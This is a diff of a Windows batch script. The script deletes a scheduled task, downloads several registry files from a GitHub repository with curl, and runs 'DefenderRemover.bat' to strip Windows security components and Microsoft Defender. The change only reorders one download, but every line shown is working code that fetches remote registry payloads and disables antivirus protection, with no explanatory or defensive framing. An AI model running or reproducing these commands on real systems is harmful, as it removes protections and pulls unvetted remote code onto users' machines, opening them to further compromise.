@@ -16,16 +16,15 @@ schtasks /delete /tn "RunPowerShellScript" /f
 cd %temp%
 mkdir Remove_SecurityComp
 cd Remove_SecurityComp
+curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove_SecurityComp.reg -o Remove_SecurityComp.reg
+cd ..
+cd Remove_SecurityComp
 
 mkdir Remove_Defender
 cd Remove_Defender
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NomoreDelayandTimeouts.reg -o NomoreDelayandTimeouts.reg
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Output.reg -o Output.reg
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RemoveShellAssociation.reg -o RemoveShellAssociation.reg
-
-cd ..
-cd Remove_SecurityComp
-curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove_SecurityComp.reg -o Remove_SecurityComp.reg
 cd ..
 DefenderRemover.bat
 
